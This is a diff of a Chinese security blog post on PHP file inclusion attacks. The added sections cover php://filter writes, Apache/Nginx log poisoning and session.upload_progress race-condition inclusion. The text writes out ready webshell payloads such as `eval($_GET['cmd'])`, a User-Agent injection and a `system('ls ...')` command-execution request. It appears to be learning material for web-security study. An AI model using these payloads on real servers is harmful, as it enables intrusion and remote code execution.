@@ -74,7 +74,7 @@ requir"><meta name="keywords" content="Security, life"><meta content="width=devi
 
 <h3 id="zip-x2F-x2F-与-phar-x2F-x2F-协议"><a href="#zip-x2F-x2F-与-phar-x2F-x2F-协议" class="headerlink" title="zip:&#x2F;&#x2F; 与 phar:&#x2F;&#x2F;协议"></a>zip:&#x2F;&#x2F; 与 phar:&#x2F;&#x2F;协议</h3><p><em>不受allow_url_fopen以及allow_url_include参数的影响</em></p>
 <p>倘若有一种情况限制文件后缀为php的文件，并且上传的文件只能是jpg格式</p>
-<p>比较旧的版本可以使用00截断、路径长度阶段登。但是若没有截断漏洞时</p>
+<p>比较旧的版本可以使用00截断、路径长度截断等。但是若没有截断漏洞时</p>
 <p>可以尝试使用zip伪协议，将木马放在压缩包中，再将压缩包后缀修改为上传白名单，然后使用zip协议进行包含</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?file=zip://C:\phpStudt\PHPTutorial\WWW\cc.jpg%23cc</span><br><span class="line"># zip://绝对路径\需要解压缩的文件%23子文件名</span><br><span class="line"></span><br><span class="line">?file=phar://cc.jpg/cc.php</span><br><span class="line"># 同zip协议，但是phar协议为相对路径，zip协议为绝对路径</span><br><span class="line"># phar://压缩包名/内部文件名，如写一个一句话木马cc.php，然后用zip协议压缩为cc.zip，再将后缀改为cc.jpg</span><br></pre></td></tr></table></figure>
 
@@ -109,6 +109,29 @@ requir"><meta name="keywords" content="Security, life"><meta content="width=devi
 <ul>
 <li>php:&#x2F;&#x2F;stdout,php:&#x2F;&#x2F;stdin,php:&#x2F;&#x2F;stderr等</li>
 </ul>
+<h3 id="file-put-contents函数"><a href="#file-put-contents函数" class="headerlink" title="file_put_contents函数"></a>file_put_contents函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>该函数的作用在将一个字符串写入到一个文件中。如果文件不存在，它会创建文件；如果文件存在，它会覆盖文件的内容</li>
+</ul>
+<p>同理，该函数也可以执行php伪协议，如构造如下payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=string.rot13/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p>并在post中写入一句话，即可成功执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();eval($_GET[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h3><p>存在本地文件包含漏洞，但无法上传文件，利用包含漏洞包含 Apache (或 Nginx)日志文件也可以获取 WebShell</p>
+<ul>
+<li>apache 日志文件路径一般是 <code>/var/log/apache/access.log</code> : Apache 的访问日志文件记录了客户端的每次请求及服务器响应的相关信息</li>
+<li>nginx 的 log 在 <code>/var/log/nginx/access.log</code> 和 <code>/var/log/nginx/error.log</code></li>
+</ul>
+<p>当访问一个不存在的资源时，日志同样会记录，例如访问 <code>http://127.0.0.1/&lt;?php phpinfo();?&gt;</code> 。Apache会记录请求 <code>&lt;?php phpinfo();?&gt;</code> </p>
+<p>因此可以将 payload 写入到 access.log 中，然后去包含该日志： <code>?file=../../../../var/log/nginx/access.log</code> </p>
+<blockquote>
+<p>需要注意，写入 payload 需要利用 burpsuit 抓包去写，如果直接在地址栏中输入，一句话木马会被编码，无法包含</p>
+</blockquote>
+<p>此外，也可以将 payload 写入 headers，如往 User-Agent 写入 <code>&lt;?php eval($_GET[2]);?&gt;</code> ，然后便可以使用 Webshell连接工具进行连接，或者直接进行命令执行 <code>?file=/var/log/nginx/access.log&amp;2=system(&#39;ls /var/www/html&#39;);phpinfo();</code></p>
 <h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>Nginx错误配置</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Location /static&#123;               # location /Purl 为普通匹配，Purl和用户请求url的开头相同就匹配成功。如请求是www.mysite.com/static/img/1.jpg</span><br><span class="line">    Alias /home/myapp/static/;  # alias指令是在其定义的目录下查找文件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>如果配置文件包含上述内容，很可能是运维人员或开发人员想让用户访问static目录(一般是静态资源目录)</p>
@@ -116,4 +139,34 @@ requir"><meta name="keywords" content="Security, life"><meta content="width=devi
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.139.128:8081/files../</span><br></pre></td></tr></table></figure>
 <p><a target="_blank" rel="noopener" href="http://t.zoukankan.com/yu2006070-01-p-10212646.html">Nginx配置文件中Location详解</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46407419/article/details/124855355">Linux Nginx的Location详解</a></p>
+<h3 id="session-文件包含"><a href="#session-文件包含" class="headerlink" title="session 文件包含"></a>session 文件包含</h3><p>在 php.ini 配置文件中的 <code>ession.upload_progress</code> 配置选项用于追踪文件上传的进度。当用户通过表单上传文件时，启用这个选项可以在服务器端记录上传的进度，它包括以下几个相关配置选项：</p>
+<ul>
+<li><code>session.upload_progress.enabled = on</code> : 启用或禁用上传进度跟踪。开启该功能后，当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中</li>
+<li><code>session.upload_progress.prefix = &quot;upload_progress_&quot;</code> : 上传进度信息 session 的键前缀</li>
+<li><code>session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code> : 文件上传进度字段的名称（通常在 HTML 表单的 name 属性中使用）</li>
+<li><code>session.upload_progress.cleanup = on</code> : 是否当文件上传完成，php是否自动清理上传进度信息 session。这将导致 session 文件内容被立即清空，从而我们无法利用。因此需要利用 <strong>条件竞争</strong> ， 在 session 文件被清空前进行文件包含利用</li>
+</ul>
+<h4 id="对-session-upload-progress-prefix-和-session-upload-progress-name-的进一步解释"><a href="#对-session-upload-progress-prefix-和-session-upload-progress-name-的进一步解释" class="headerlink" title="对 session.upload_progress.prefix 和 session.upload_progress.name 的进一步解释"></a>对 <code>session.upload_progress.prefix</code> 和 <code>session.upload_progress.name</code> 的进一步解释</h4><p>假如有如下上传表单：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;file123&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Upload&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在这个例子中，<code>PHP_SESSION_UPLOAD_PROGRESS</code> 字段的值是 <code>file123</code> ， <code>session.upload_progress.prefix</code> 的配置值为 <code>upload_progress_</code> ，那么在上传进度信息 session 中的键名就是 <code>upload_progress_file123</code> </p>
+<p>在 PHP 中，可以由下面的方法得到 session 的键名并输出上传进度的信息：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;session.upload_progress.prefix&quot;</span>) . <span class="string">&quot;file123&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="variable">$key</span>])) &#123;</span><br><span class="line">    <span class="variable">$progress</span> = <span class="variable">$_SESSION</span>[<span class="variable">$key</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Uploaded &quot;</span> . <span class="variable">$progress</span>[<span class="string">&#x27;bytes_processed&#x27;</span>] . <span class="string">&quot; of &quot;</span> . <span class="variable">$progress</span>[<span class="string">&#x27;content_length&#x27;</span>] . <span class="string">&quot; bytes.&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="session-创建方式"><a href="#session-创建方式" class="headerlink" title="session 创建方式"></a>session 创建方式</h4><ol>
+<li>php <code>session_start()</code></li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 开始新的或恢复现有的会话</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">// 设置会话变量</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;john_doe&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>当我们要创建 session 时往往会在 php 代码里写 session_start()，但如果不写的话，也是可以创建的</p>
+<ol start="2">
+<li><code>php_ini</code> 设置 <code>session.auto_start = On</code></li>
+</ol>
+<p>当开启该选项时，php 在接受请求时自动初始化 session，不需要执行 <code>session_start()</code></p>
+<blockquote>
+<p>但默认情况下，该选项关闭</p>
+</blockquote>
+<ol start="3">
+<li><code>php_ini</code> 设置 <code>session.use_strict_mode = 0</code></li>
+</ol>
+<p>该配置选项默认值为 <code>0</code>，这样用户可以自定义 session ID</p>
+<p>比如在 cookie 中设置 <code>PHPSESSID=MySession</code>，便会在服务器 <code>/tmp</code> 目录或者 <code>/var/lib/php/sessions/</code> 下创建一个文件： <code>sess_MySession</code> 。即便没有设置自动初始化 session，php 也会产生 session，并生成一个键值，这个键值由 <code>ini.get(&quot;session.upload_progress.prefix&quot;)</code> + <code>session.upload_progress.name</code> 值组成，最后被一起写入 <code>sess_</code> 文件里</p>
 </div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-10-08</span><i class="fa fa-tag"></i><a class="tag" href="/tags/web/" title="web">web </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2022/10/08/文件包含/,Mini's blog,文件包含,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2022/10/18/SSRF/" title="SSRF">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2022/10/06/Command-Execution/" title="命令执行">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
